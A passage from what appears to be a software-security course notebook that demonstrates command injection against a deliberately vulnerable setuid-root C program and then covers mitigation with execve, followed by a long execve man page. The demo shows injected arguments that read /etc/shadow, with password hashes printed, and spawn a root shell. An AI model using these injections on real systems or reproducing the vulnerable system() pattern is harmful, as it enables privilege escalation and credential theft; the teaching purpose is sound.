      "\n",
      "int main(int argc, char *argv[])\n",
      "{\n",
      "  char *v[3];\n",
      "  char *command;\n",
      "\n",
      "  if(argc < 2) {\n",
      "    printf(\"Usage: calall <file_path>.\\n\");\n",
      "    return 1;\n",
      "  }\n",
      "\n",
      "  v[0] = \"/bin/cat\"; v[1] = argv[1]; v[2] = NULL;\n",
      "\n",
      "  command = malloc(strlen(v[0]) + strlen(v[1]) + 2);\n",
      "  sprintf(command, \"%s %s\", v[0], v[1]);\n",
      "\n",
      "  // Use only one of the followings.\n",
      "  system(command);\n",
      "  // execve(v[0], v, NULL);\n",
      "\n",
      "  return 0 ;\n",
      "}"
     ]
    }
   ],
   "source": [
    "! cat catall.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 32,
   "id": "18e70fcf-3717-498a-b31a-406bd8d92cf0",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: g++ -g -Wall -std=c++17 catall.cpp -o catall\n",
      "\u001b[01m\u001b[Kcatall.cpp:\u001b[m\u001b[K In function ‘\u001b[01m\u001b[Kint\u001b[01;32m\u001b[K main\u001b[m\u001b[K(int, char**)\u001b[m\u001b[K’:\n",
      "\u001b[01m\u001b[Kcatall.cpp:16:10:\u001b[m\u001b[K \u001b[01;35m\u001b[Kwarning: \u001b[m\u001b[KISO C++ forbids converting a string constant to ‘\u001b[01m\u001b[Kchar*\u001b[m\u001b[K’ [\u001b[01;35m\u001b[K\u001b]8;;https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html#index-Wwrite-strings\u0007-Wwrite-strings\u001b]8;;\u0007\u001b[m\u001b[K]\n",
      "   16 |   v[0] = \u001b[01;35m\u001b[K\"/bin/cat\"\u001b[m\u001b[K; v[1] = argv[1]; v[2] = NULL;\n",
      "      |          \u001b[01;35m\u001b[K^~~~~~~~~~\u001b[m\u001b[K\n",
      "sudo chown root catall\n",
      "sudo chmod +s catall\n"
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S make"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "55e1c5f1-9368-41a6-95b9-3d37c9fc5709",
   "metadata": {},
   "source": [
    "- you must use the \"quotations\" around the commands \";\" separated arguments\n",
    "- quotes ensure everything is passed as a single argument to the vulnurable program\n",
    "- note, injecting /bin/zsh gives root but injecting  /bin/sh doesn not \n",
    "\n",
    "```bash\n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/injection]\n",
    "└─$ ./catall \"adf; cat /etc/shadow\"\n",
    "/bin/cat: adf: No such file or directory\n",
    "root:!:19662:0:99999:7:::\n",
    "...\n",
    "kali:$y$j9T$K/agt9PK0eYweoRVbd9yK0$6BUblkWhNb00ZJWw7nYm0fZL1bpF.1BAs5h0CRF4xj2:19662:0:99999:7:::\n",
    "bob:$y$j9T$KoIINXes24L0Z2qTeAdEX0$aNnlXFBUXuSZrsiCKPFPCxMIz/KNoz0gIzFnOppN2F1:19739:0:99999:7::\n",
    "\n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/injection]\n",
    "└─$ ./catall \"adf; /bin/bash\"\n",
    "/bin/cat: adf: No such file or directory\n",
    "bash-5.2$ whoami\n",
    "kali\n",
    "bash-5.2$ ./catall \"asdf; /bin/bash\"\n",
    "/bin/cat: asdf: No such file or directory\n",
    "bash-5.2$ exit\n",
    "exit\n",
    "bash-5.2$ exit\n",
    "exit\n",
    "                                                                                                                                                                                                                                                                                         \n",
    "(base) ┌──(kali㉿kali)-[~/projects/SoftwareSecurity/demos/injection]\n",
    "└─$ ./catall \"adf; /bin/zsh\" \n",
    "/bin/cat: adf: No such file or directory\n",
    "x86_64-conda-linux-gnu# whoami\n",
    "root\n",
    "x86_64-conda-linux-gnu# id\n",
    "uid=1000(kali) gid=1000(kali) euid=0(root) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),105(netdev),117(wireshark),120(bluetooth),133(scanner),140(kaboxer)\n",
    "x86_64-conda-linux-gnu# \n",
    "```"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "641e510d-ad23-4829-b3f8-1fac0bfa2e8e",
   "metadata": {},
   "source": [
    "## Mitigation\n",
    "\n",
    "- avoid `system` call if possible\n",
    "- use `execve` properly instead of `system` when executing system commands from C/C++ programs\n",
    "- `execve` allows you to separate the command from the input data\n",
    "- `exec` family of function is lower-level compared to system and allows for granular control on how the program should be executed\n",
    "- allows you to pass your own environment variables in the third argument\n",
    "- replaces the current process image with a new one, executing the specified program\n",
    "- you need to provide full path to the executable and explictly pass an array of arguments\n",
    "    - preventing the ENV VARS overriding attack \n",
    "- not all `exec` family funcions behave similarly\n",
    "    - `execlp(), execvp(), execvpe()` duplicate the actions of the shell\n",
    "    - these functions can be attacked using the PATH Environment Variable\n",
    "    \n",
    "```bash\n",
    "execve(command_name, input_data_argument, env_variables);\n",
    "```\n",
    "\n",
    "- patch the `catall.cpp` program and try to exploit it again\n",
    "- see `demos/injection/secure` folder for the secure version of `cat_all` program\n",
    "- compile and try the command injection again..."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 34,
   "id": "f289fca3-d745-4162-b025-2fd02db24f70",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\u001b[4mexecve\u001b[24m(2)                     System Calls Manual                    \u001b[4mexecve\u001b[24m(2)\n",
      "\n",
      "\u001b[1mNAME\u001b[0m\n",
      "       execve - execute program\n",
      "\n",
      "\u001b[1mLIBRARY\u001b[0m\n",
      "       Standard C library (\u001b[4mlibc\u001b[24m, \u001b[4m-lc\u001b[24m)\n",
      "\n",
      "\u001b[1mSYNOPSIS\u001b[0m\n",
      "       \u001b[1m#include <unistd.h>\u001b[0m\n",
      "\n",
      "       \u001b[1mint execve(const char *\u001b[4m\u001b[22mpathname\u001b[24m\u001b[1m, char *const _Nullable \u001b[4m\u001b[22margv\u001b[24m\u001b[1m[],\u001b[0m\n",
      "                  \u001b[1mchar *const _Nullable \u001b[4m\u001b[22menvp\u001b[24m\u001b[1m[]);\u001b[0m\n",
      "\n",
      "\u001b[1mDESCRIPTION\u001b[0m\n",
      "       \u001b[1mexecve\u001b[22m() executes the program referred to by \u001b[4mpathname\u001b[24m.  This causes the\n",
      "       program  that  is  currently being run by the calling process to be re‐\n",
      "       placed with a new program, with  newly  initialized  stack,  heap,  and\n",
      "       (initialized and uninitialized) data segments.\n",
      "\n",
      "       \u001b[4mpathname\u001b[24m  must be either a binary executable, or a script starting with\n",
      "       a line of the form:\n",
      "\n",
      "           \u001b[1m#!\u001b[4m\u001b[22minterpreter\u001b[24m [optional-arg]\n",
      "\n",
      "       For details of the latter case, see \"Interpreter scripts\" below.\n",
      "\n",
      "       \u001b[4margv\u001b[24m is an array of pointers to strings passed to the  new  program  as\n",
      "       its  command-line arguments.  By convention, the first of these strings\n",
      "       (i.e., \u001b[4margv[0]\u001b[24m) should contain the filename associated  with  the  file\n",
      "       being  executed.   The \u001b[4margv\u001b[24m array must be terminated by a NULL pointer.\n",
      "       (Thus, in the new program, \u001b[4margv[argc]\u001b[24m will be NULL.)\n",
      "\n",
      "       \u001b[4menvp\u001b[24m is an array of pointers to strings,  conventionally  of  the  form\n",
      "       \u001b[1mkey=value\u001b[22m, which are passed as the environment of the new program.  The\n",
      "       \u001b[4menvp\u001b[24m array must be terminated by a NULL pointer.\n",
      "\n",
      "       This  manual  page  describes  the  Linux system call in detail; for an\n",
      "       overview of the nomenclature and the many, often preferable,  standard‐\n",
      "       ised  variants  of  this function provided by libc, including ones that\n",
      "       search the \u001b[1mPATH \u001b[22menvironment variable, see \u001b[1mexec\u001b[22m(3).\n",
      "\n",
      "       The argument vector and environment can be accessed  by  the  new  pro‐\n",
      "       gram's main function, when it is defined as:\n",
      "\n",
      "           int main(int argc, char *argv[], char *envp[])\n",
      "\n",
      "       Note, however, that the use of a third argument to the main function is\n",
      "       not  specified in POSIX.1; according to POSIX.1, the environment should\n",
      "       be accessed via the external variable \u001b[1menviron\u001b[22m(7).\n",
      "\n",
      "       \u001b[1mexecve\u001b[22m() does not return on success, and the  text,  initialized  data,\n",
      "       uninitialized  data  (bss),  and stack of the calling process are over‐\n",
      "       written according to the contents of the newly loaded program.\n",
      "\n",
      "       If the current program is being ptraced, a \u001b[1mSIGTRAP \u001b[22msignal is sent to it\n",
      "       after a successful \u001b[1mexecve\u001b[22m().\n",
      "\n",
      "       If the set-user-ID bit is set on the program file referred to by  \u001b[4mpath‐\u001b[0m\n",
      "       \u001b[4mname\u001b[24m,  then  the effective user ID of the calling process is changed to\n",
      "       that of the owner of the program file.  Similarly, if the  set-group-ID\n",
      "       bit  is  set  on  the  program file, then the effective group ID of the\n",
      "       calling process is set to the group of the program file.\n",
      "\n",
      "       The aforementioned transformations of the effective IDs  are  \u001b[4mnot\u001b[24m  per‐\n",
      "       formed (i.e., the set-user-ID and set-group-ID bits are ignored) if any\n",
      "       of the following is true:\n",
      "\n",
      "       •  the  \u001b[4mno_new_privs\u001b[24m  attribute  is  set  for  the  calling thread (see\n",
      "          \u001b[1mprctl\u001b[22m(2));\n",
      "\n",
      "       •  the underlying filesystem is mounted \u001b[4mnosuid\u001b[24m (the \u001b[1mMS_NOSUID \u001b[22mflag  for\n",
      "          \u001b[1mmount\u001b[22m(2)); or\n",
      "\n",
      "       •  the calling process is being ptraced.\n",
      "\n",
      "       The capabilities of the program file (see \u001b[1mcapabilities\u001b[22m(7)) are also ig‐\n",
      "       nored if any of the above are true.\n",
      "\n",
      "       The  effective  user ID of the process is copied to the saved set-user-\n",
      "       ID; similarly, the effective group ID is copied to the saved set-group-\n",
      "       ID.  This copying takes place after any effective ID changes that occur\n",
      "       because of the set-user-ID and set-group-ID mode bits.\n",
      "\n",
      "       The process's real UID and real GID, as well as its supplementary group\n",
      "       IDs, are unchanged by a call to \u001b[1mexecve\u001b[22m().\n",
      "\n",
      "       If the executable is an a.out dynamically linked binary executable con‐\n",
      "       taining shared-library stubs, the  Linux  dynamic  linker  \u001b[1mld.so\u001b[22m(8)  is\n",
      "       called  at  the  start of execution to bring needed shared objects into\n",
      "       memory and link the executable with them.\n",
      "\n",
      "       If the executable is a dynamically linked ELF  executable,  the  inter‐\n",
      "       preter named in the PT_INTERP segment is used to load the needed shared\n",
      "       objects.  This interpreter is typically \u001b[4m/lib/ld-linux.so.2\u001b[24m for binaries\n",
      "       linked with glibc (see \u001b[1mld-linux.so\u001b[22m(8)).\n",
      "\n",
      "   \u001b[1mEffect on process attributes\u001b[0m\n",
      "       All  process  attributes  are  preserved during an \u001b[1mexecve\u001b[22m(), except the\n",
      "       following:\n",
      "\n",
      "       •  The dispositions of any signals that are being caught are  reset  to\n",
      "          the default (\u001b[1msignal\u001b[22m(7)).\n",
      "\n",
      "       •  Any alternate signal stack is not preserved (\u001b[1msigaltstack\u001b[22m(2)).\n",
      "\n",
      "       •  Memory mappings are not preserved (\u001b[1mmmap\u001b[22m(2)).\n",
      "\n",
      "       •  Attached System V shared memory segments are detached (\u001b[1mshmat\u001b[22m(2)).\n",
      "\n",
      "       •  POSIX shared memory regions are unmapped (\u001b[1mshm_open\u001b[22m(3)).\n",
      "\n",
      "       •  Open POSIX message queue descriptors are closed (\u001b[1mmq_overview\u001b[22m(7)).\n",
      "\n",
      "       •  Any open POSIX named semaphores are closed (\u001b[1msem_overview\u001b[22m(7)).\n",
      "\n",
      "       •  POSIX timers are not preserved (\u001b[1mtimer_create\u001b[22m(2)).\n",
      "\n",
      "       •  Any open directory streams are closed (\u001b[1mopendir\u001b[22m(3)).\n",
      "\n",
      "       •  Memory locks are not preserved (\u001b[1mmlock\u001b[22m(2), \u001b[1mmlockall\u001b[22m(2)).\n",
      "\n",
      "       •  Exit handlers are not preserved (\u001b[1matexit\u001b[22m(3), \u001b[1mon_exit\u001b[22m(3)).\n",
      "\n",
      "       •  The   floating-point  environment  is  reset  to  the  default  (see\n",
      "          \u001b[1mfenv\u001b[22m(3)).\n",
      "\n",
      "       The process attributes in the  preceding  list  are  all  specified  in\n",
      "       POSIX.1.   The following Linux-specific process attributes are also not\n",
      "       preserved during an \u001b[1mexecve\u001b[22m():\n",
      "\n",
      "       •  The process's \"dumpable\" attribute is set to the value 1,  unless  a\n",
      "          set-user-ID program, a set-group-ID program, or a program with capa‐\n",
      "          bilities  is being executed, in which case the dumpable flag may in‐\n",
      "          stead be reset to the value in  \u001b[4m/proc/sys/fs/suid_dumpable\u001b[24m,  in  the\n",
      "          circumstances  described  under  \u001b[1mPR_SET_DUMPABLE  \u001b[22min \u001b[1mprctl\u001b[22m(2).  Note\n",
      "          that changes to the \"dumpable\"  attribute  may  cause  ownership  of\n",
      "          files  in  the process's \u001b[4m/proc/\u001b[24mpid directory to change to \u001b[4mroot:root\u001b[24m,\n",
      "          as described in \u001b[1mproc\u001b[22m(5).\n",
      "\n",
      "       •  The \u001b[1mprctl\u001b[22m(2) \u001b[1mPR_SET_KEEPCAPS \u001b[22mflag is cleared.\n",
      "\n",
      "       •  (Since Linux 2.4.36 / 2.6.23) If a set-user-ID or set-group-ID  pro‐\n",
      "          gram is being executed, then the parent death signal set by \u001b[1mprctl\u001b[22m(2)\n",
      "          \u001b[1mPR_SET_PDEATHSIG \u001b[22mflag is cleared.\n",
      "\n",
      "       •  The  process  name, as set by \u001b[1mprctl\u001b[22m(2) \u001b[1mPR_SET_NAME \u001b[22m(and displayed by\n",
      "          \u001b[4mps\u001b[24m \u001b[4m-o\u001b[24m \u001b[4mcomm\u001b[24m), is reset to the name of the new executable file.\n",
      "\n",
      "       •  The \u001b[1mSECBIT_KEEP_CAPS \u001b[4m\u001b[22msecurebits\u001b[24m  flag  is  cleared.   See  \u001b[1mcapabili‐\u001b[0m\n",
      "          \u001b[1mties\u001b[22m(7).\n",
      "\n",
      "       •  The termination signal is reset to \u001b[1mSIGCHLD \u001b[22m(see \u001b[1mclone\u001b[22m(2)).\n",
      "\n",
      "       •  The  file  descriptor  table  is unshared, undoing the effect of the\n",
      "          \u001b[1mCLONE_FILES \u001b[22mflag of \u001b[1mclone\u001b[22m(2).\n",
      "\n",
      "       Note the following further points:\n",
      "\n",
      "       •  All threads other than the calling thread are  destroyed  during  an\n",
      "          \u001b[1mexecve\u001b[22m().   Mutexes, condition variables, and other pthreads objects\n",
      "          are not preserved.\n",
      "\n",
      "       •  The equivalent of \u001b[4msetlocale(LC_ALL,\u001b[24m  \u001b[4m\"C\")\u001b[24m  is  executed  at  program\n",
      "          start-up.\n",
      "\n",
      "       •  POSIX.1  specifies that the dispositions of any signals that are ig‐\n",
      "          nored or set to the default are left unchanged.   POSIX.1  specifies\n",
      "          one  exception:  if \u001b[1mSIGCHLD \u001b[22mis being ignored, then an implementation\n",
      "          may leave the disposition unchanged or  reset  it  to  the  default;\n",
      "          Linux does the former.\n",
      "\n",
      "       •  Any   outstanding   asynchronous   I/O   operations   are   canceled\n",
      "          (\u001b[1maio_read\u001b[22m(3), \u001b[1maio_write\u001b[22m(3)).\n",
      "\n",
      "       •  For the handling of  capabilities  during  \u001b[1mexecve\u001b[22m(),  see  \u001b[1mcapabili‐\u001b[0m\n",
      "          \u001b[1mties\u001b[22m(7).\n",
      "\n",
      "       •  By  default,  file descriptors remain open across an \u001b[1mexecve\u001b[22m().  File\n",
      "          descriptors that are marked close-on-exec are closed;  see  the  de‐\n",
      "          scription  of  \u001b[1mFD_CLOEXEC  \u001b[22min  \u001b[1mfcntl\u001b[22m(2).   (If  a file descriptor is\n",
      "          closed, this will cause the release of all record locks obtained  on\n",
      "          the  underlying  file  by  this process.  See \u001b[1mfcntl\u001b[22m(2) for details.)\n",
      "          POSIX.1 says that if file descriptors 0, 1, and 2 would otherwise be\n",
      "          closed after a successful \u001b[1mexecve\u001b[22m(), and the process would gain priv‐\n",
      "          ilege because the set-user-ID or set-group-ID mode bit  was  set  on\n",
      "          the  executed file, then the system may open an unspecified file for\n",
      "          each of these file descriptors.  As a general principle, no portable\n",
      "          program, whether privileged or not, can assume that these three file\n",
      "          descriptors will remain closed across an \u001b[1mexecve\u001b[22m().\n",
      "\n",
      "   \u001b[1mInterpreter scripts\u001b[0m\n",
      "       An interpreter script is a text file that has  execute  permission  en‐\n",
      "       abled and whose first line is of the form:\n",
      "\n",
      "           \u001b[1m#!\u001b[4m\u001b[22minterpreter\u001b[24m [optional-arg]\n",
      "\n",
      "       The \u001b[4minterpreter\u001b[24m must be a valid pathname for an executable file.\n",
      "\n",
      "       If  the  \u001b[4mpathname\u001b[24m argument of \u001b[1mexecve\u001b[22m() specifies an interpreter script,\n",
      "       then \u001b[4minterpreter\u001b[24m will be invoked with the following arguments:\n",
      "\n",
      "           \u001b[4minterpreter\u001b[24m [optional-arg] \u001b[4mpathname\u001b[24m arg...\n",
      "\n",
      "       where \u001b[4mpathname\u001b[24m is the pathname of the file specified as the first argu‐\n",
      "       ment of \u001b[1mexecve\u001b[22m(), and \u001b[4marg...\u001b[24m  is the series of words pointed to by  the\n",
      "       \u001b[4margv\u001b[24m  argument of \u001b[1mexecve\u001b[22m(), starting at \u001b[4margv[1]\u001b[24m.  Note that there is no\n",
      "       way to get the \u001b[4margv[0]\u001b[24m that was passed to the \u001b[1mexecve\u001b[22m() call.\n",
      "\n",
      "       For portable use, \u001b[4moptional-arg\u001b[24m should either be absent, or be specified\n",
      "       as a single word (i.e., it should not contain white space);  see  NOTES\n",
      "       below.\n",
      "\n",
      "       Since  Linux  2.6.28, the kernel permits the interpreter of a script to\n",
      "       itself be a script.  This permission is recursive, up  to  a  limit  of\n",
      "       four  recursions,  so that the interpreter may be a script which is in‐\n",
      "       terpreted by a script, and so on.\n",
      "\n",
      "   \u001b[1mLimits on size of arguments and environment\u001b[0m\n",
      "       Most UNIX implementations impose some limit on the total  size  of  the\n",
      "       command-line argument (\u001b[4margv\u001b[24m) and environment (\u001b[4menvp\u001b[24m) strings that may be\n",
      "       passed to a new program.  POSIX.1 allows an implementation to advertise\n",
      "       this  limit using the \u001b[1mARG_MAX \u001b[22mconstant (either defined in \u001b[4m<limits.h>\u001b[24m or\n",
      "       available at run time using the call \u001b[4msysconf(_SC_ARG_MAX)\u001b[24m).\n",
      "\n",
      "       Before Linux 2.6.23, the memory used to store the environment and argu‐\n",
      "       ment strings was limited to 32 pages (defined by  the  kernel  constant\n",
      "       \u001b[1mMAX_ARG_PAGES\u001b[22m).   On architectures with a 4-kB page size, this yields a\n",
      "       maximum size of 128 kB.\n",
      "\n",
      "       On Linux 2.6.23 and later, most architectures support a size limit  de‐\n",
      "       rived from the soft \u001b[1mRLIMIT_STACK \u001b[22mresource limit (see \u001b[1mgetrlimit\u001b[22m(2)) that\n",
      "       is  in  force at the time of the \u001b[1mexecve\u001b[22m() call.  (Architectures with no\n",
      "       memory management unit are excepted: they maintain the limit  that  was\n",
      "       in  effect before Linux 2.6.23.)  This change allows programs to have a\n",
      "       much larger argument and/or environment list.  For these architectures,\n",
      "       the total size is limited to 1/4 of the allowed stack size.   (Imposing\n",
      "       the  1/4-limit  ensures  that  the  new  program  always has some stack\n",
      "       space.)  Additionally, the total size is limited to 3/4 of the value of\n",
      "       the kernel constant \u001b[1m_STK_LIM \u001b[22m(8 MiB).  Since Linux 2.6.25,  the  kernel\n",
      "       also  places a floor of 32 pages on this size limit, so that, even when\n",
      "       \u001b[1mRLIMIT_STACK \u001b[22mis set very low, applications are guaranteed  to  have  at\n",
      "       least  as  much argument and environment space as was provided by Linux\n",
      "       2.6.22 and earlier.  (This guarantee was not provided in  Linux  2.6.23\n",
      "       and  2.6.24.)  Additionally, the limit per string is 32 pages (the ker‐\n",
      "       nel constant \u001b[1mMAX_ARG_STRLEN\u001b[22m), and the  maximum  number  of  strings  is\n",
      "       0x7FFFFFFF.\n",
      "\n",
      "\u001b[1mRETURN VALUE\u001b[0m\n",
      "       On  success, \u001b[1mexecve\u001b[22m() does not return, on error -1 is returned, and \u001b[4mer‐\u001b[0m\n",
      "       \u001b[4mrno\u001b[24m is set to indicate the error.\n",
      "\n",
      "\u001b[1mERRORS\u001b[0m\n",
      "       \u001b[1mE2BIG  \u001b[22mThe total number of bytes in the environment (\u001b[4menvp\u001b[24m) and argument\n",
      "              list (\u001b[4margv\u001b[24m) is too large.\n",
      "\n",
      "       \u001b[1mEACCES \u001b[22mSearch permission is denied on a component of the path prefix of\n",
      "              \u001b[4mpathname\u001b[24m or  the  name  of  a  script  interpreter.   (See  also\n",
      "              \u001b[1mpath_resolution\u001b[22m(7).)\n",
      "\n",
      "       \u001b[1mEACCES \u001b[22mThe file or a script interpreter is not a regular file.\n",
      "\n",
      "       \u001b[1mEACCES \u001b[22mExecute permission is denied for the file or a script or ELF in‐\n",
      "              terpreter.\n",
      "\n",
      "       \u001b[1mEACCES \u001b[22mThe filesystem is mounted \u001b[4mnoexec\u001b[24m.\n",
      "\n",
      "       \u001b[1mEAGAIN \u001b[22m(since Linux 3.1)\n",
      "              Having  changed  its  real UID using one of the \u001b[1mset*uid\u001b[22m() calls,\n",
      "              the caller was—and is now still—above its \u001b[1mRLIMIT_NPROC  \u001b[22mresource\n",
      "              limit  (see  \u001b[1msetrlimit\u001b[22m(2)).   For a more detailed explanation of\n",
      "              this error, see NOTES.\n",
      "\n",
      "       \u001b[1mEFAULT \u001b[4m\u001b[22mpathname\u001b[24m or one of the pointers in  the  vectors  \u001b[4margv\u001b[24m  or  \u001b[4menvp\u001b[0m\n",
      "              points outside your accessible address space.\n",
      "\n",
      "       \u001b[1mEINVAL \u001b[22mAn  ELF  executable  had  more than one PT_INTERP segment (i.e.,\n",
      "              tried to name more than one interpreter).\n",
      "\n",
      "       \u001b[1mEIO    \u001b[22mAn I/O error occurred.\n",
      "\n",
      "       \u001b[1mEISDIR \u001b[22mAn ELF interpreter was a directory.\n",
      "\n",
      "       \u001b[1mELIBBAD\u001b[0m\n",
      "              An ELF interpreter was not in a recognized format.\n",
      "\n",
      "       \u001b[1mELOOP  \u001b[22mToo many symbolic links were encountered in  resolving  \u001b[4mpathname\u001b[0m\n",
      "              or the name of a script or ELF interpreter.\n",
      "\n",
      "       \u001b[1mELOOP  \u001b[22mThe  maximum recursion limit was reached during recursive script\n",
      "              interpretation (see \"Interpreter scripts\", above).  Before Linux\n",
      "              3.8, the error produced for this case was \u001b[1mENOEXEC\u001b[22m.\n",
      "\n",
      "       \u001b[1mEMFILE \u001b[22mThe per-process limit on the number of open file descriptors has\n",
      "              been reached.\n",
      "\n",
      "       \u001b[1mENAMETOOLONG\u001b[0m\n",
      "              \u001b[4mpathname\u001b[24m is too long.\n",
      "\n",
      "       \u001b[1mENFILE \u001b[22mThe system-wide limit on the total number of open files has been\n",
      "              reached.\n",
      "\n",
      "       \u001b[1mENOENT \u001b[22mThe file \u001b[4mpathname\u001b[24m or a script or ELF interpreter does not exist.\n",
      "\n",
      "       \u001b[1mENOEXEC\u001b[0m\n",
      "              An executable is not in a recognized format, is  for  the  wrong\n",
      "              architecture,  or has some other format error that means it can‐\n",
      "              not be executed.\n",
      "\n",
      "       \u001b[1mENOMEM \u001b[22mInsufficient kernel memory was available.\n",
      "\n",
      "       \u001b[1mENOTDIR\u001b[0m\n",
      "              A component of the path prefix of \u001b[4mpathname\u001b[24m or a  script  or  ELF\n",
      "              interpreter is not a directory.\n",
      "\n",
      "       \u001b[1mEPERM  \u001b[22mThe filesystem is mounted \u001b[4mnosuid\u001b[24m, the user is not the superuser,\n",
      "              and the file has the set-user-ID or set-group-ID bit set.\n",
      "\n",
      "       \u001b[1mEPERM  \u001b[22mThe  process  is being traced, the user is not the superuser and\n",
      "              the file has the set-user-ID or set-group-ID bit set.\n",
      "\n",
      "       \u001b[1mEPERM  \u001b[22mA \"capability-dumb\" applications would not obtain the  full  set\n",
      "              of  permitted  capabilities granted by the executable file.  See\n",
      "              \u001b[1mcapabilities\u001b[22m(7).\n",
      "\n",
      "       \u001b[1mETXTBSY\u001b[0m\n",
      "              The specified executable was open for writing  by  one  or  more\n",
      "              processes.\n",
      "\n",
      "\u001b[1mVERSIONS\u001b[0m\n",
      "       POSIX does not document the #! behavior, but it exists (with some vari‐\n",
      "       ations) on other UNIX systems.\n",
      "\n",
      "       On  Linux, \u001b[4margv\u001b[24m and \u001b[4menvp\u001b[24m can be specified as NULL.  In both cases, this\n",
      "       has the same effect as specifying the argument as a pointer to  a  list\n",
      "       containing  a  single null pointer.  \u001b[1mDo not take advantage of this non‐\u001b[0m\n",
      "       \u001b[1mstandard and nonportable misfeature!  \u001b[22mOn many other UNIX systems, spec‐\n",
      "       ifying \u001b[4margv\u001b[24m as NULL will result in an error (\u001b[1mEFAULT\u001b[22m).  \u001b[4mSome\u001b[24m other  UNIX\n",
      "       systems treat the \u001b[4menvp==NULL\u001b[24m case the same as Linux.\n",
      "\n",
      "       POSIX.1  says  that  values  returned by \u001b[1msysconf\u001b[22m(3) should be invariant\n",
      "       over the lifetime of a process.  However, since Linux  2.6.23,  if  the\n",
      "       \u001b[1mRLIMIT_STACK  \u001b[22mresource  limit  changes,  then  the  value  reported  by\n",
      "       \u001b[1m_SC_ARG_MAX \u001b[22mwill also change, to reflect the fact  that  the  limit  on\n",
      "       space  for holding command-line arguments and environment variables has\n",
      "       changed.\n",
      "\n",
      "   \u001b[1mInterpreter scripts\u001b[0m\n",
      "       The kernel imposes a maximum length on the text that follows  the  \"#!\"\n",
      "       characters  at  the  start of a script; characters beyond the limit are\n",
      "       ignored.  Before Linux 5.1, the limit is 127 characters.   Since  Linux\n",
      "       5.1, the limit is 255 characters.\n",
      "\n",
      "       The  semantics  of  the  \u001b[4moptional-arg\u001b[24m argument of an interpreter script\n",
      "       vary across implementations.  On Linux, the entire string following the\n",
      "       \u001b[4minterpreter\u001b[24m name is passed as a single argument to the interpreter, and\n",
      "       this string can include white space.  However, behavior differs on some\n",
      "       other systems.  Some systems use the first white space to terminate \u001b[4mop‐\u001b[0m\n",
      "       \u001b[4mtional-arg\u001b[24m.  On some systems, an interpreter script can  have  multiple\n",
      "       arguments, and white spaces in \u001b[4moptional-arg\u001b[24m are used to delimit the ar‐\n",
      "       guments.\n",
      "\n",
      "       Linux (like most other modern UNIX systems) ignores the set-user-ID and\n",
      "       set-group-ID bits on scripts.\n",
      "\n",
      "\u001b[1mSTANDARDS\u001b[0m\n",
      "       POSIX.1-2008.\n",
      "\n",
      "\u001b[1mHISTORY\u001b[0m\n",
      "       POSIX.1-2001, SVr4, 4.3BSD.\n",
      "\n",
      "       With UNIX V6, the argument list of an \u001b[1mexec\u001b[22m() call was ended by 0, while\n",
      "       the  argument  list  of \u001b[4mmain\u001b[24m was ended by -1.  Thus, this argument list\n",
      "       was not directly usable in a further \u001b[1mexec\u001b[22m() call.  Since UNIX V7,  both\n",
      "       are NULL.\n",
      "\n",
      "\u001b[1mNOTES\u001b[0m\n",
      "       One  sometimes  sees  \u001b[1mexecve\u001b[22m()  (and the related functions described in\n",
      "       \u001b[1mexec\u001b[22m(3)) described as \"executing a \u001b[4mnew\u001b[24m process\" (or similar).  This  is\n",
      "       a  highly misleading description: there is no new process; many attrib‐\n",
      "       utes of the calling process remain unchanged (in particular, its  PID).\n",
      "       All  that \u001b[1mexecve\u001b[22m() does is arrange for an existing process (the calling\n",
      "       process) to execute a new program.\n",
      "\n",
      "       Set-user-ID and set-group-ID processes can not be \u001b[1mptrace\u001b[22m(2)d.\n",
      "\n",
      "       The result of mounting a filesystem \u001b[4mnosuid\u001b[24m varies across  Linux  kernel\n",
      "       versions:  some  will  refuse execution of set-user-ID and set-group-ID\n",
      "       executables when this would give the user powers they did not have  al‐\n",
      "       ready  (and  return  \u001b[1mEPERM\u001b[22m),  some will just ignore the set-user-ID and\n",
      "       set-group-ID bits and \u001b[1mexec\u001b[22m() successfully.\n",
      "\n",
      "       In most cases where \u001b[1mexecve\u001b[22m() fails, control returns to the original ex‐\n",
      "       ecutable image, and the caller of \u001b[1mexecve\u001b[22m() can then handle  the  error.\n",
      "       However,  in  (rare)  cases  (typically caused by resource exhaustion),\n",
      "       failure may occur past the point of no return: the original  executable\n",
      "       image  has  been  torn  down, but the new image could not be completely\n",
      "       built.  In such cases, the kernel kills  the  process  with  a  \u001b[1mSIGSEGV\u001b[0m\n",
      "       (\u001b[1mSIGKILL \u001b[22muntil Linux 3.17) signal.\n",
      "\n",
      "   \u001b[1mexecve() and EAGAIN\u001b[0m\n",
      "       A  more  detailed explanation of the \u001b[1mEAGAIN \u001b[22merror that can occur (since\n",
      "       Linux 3.1) when calling \u001b[1mexecve\u001b[22m() is as follows.\n",
      "\n",
      "       The \u001b[1mEAGAIN \u001b[22merror can occur when a  \u001b[4mpreceding\u001b[24m  call  to  \u001b[1msetuid\u001b[22m(2),  \u001b[1mse‐\u001b[0m\n",
      "       \u001b[1mtreuid\u001b[22m(2),  or  \u001b[1msetresuid\u001b[22m(2)  caused the real user ID of the process to\n",
      "       change, and that change caused the process to exceed  its  \u001b[1mRLIMIT_NPROC\u001b[0m\n",
      "       resource limit (i.e., the number of processes belonging to the new real\n",
      "       UID  exceeds  the resource limit).  From Linux 2.6.0 to Linux 3.0, this\n",
      "       caused the \u001b[1mset*uid\u001b[22m() call to fail.  (Before  Linux  2.6,  the  resource\n",
      "       limit was not imposed on processes that changed their user IDs.)\n",
      "\n",
      "       Since  Linux  3.1,  the  scenario  just  described no longer causes the\n",
      "       \u001b[1mset*uid\u001b[22m() call to fail, because it too  often  led  to  security  holes\n",
      "       where  buggy  applications  didn't  check the return status and assumed\n",
      "       that—if the caller had root privileges—the call would  always  succeed.\n",
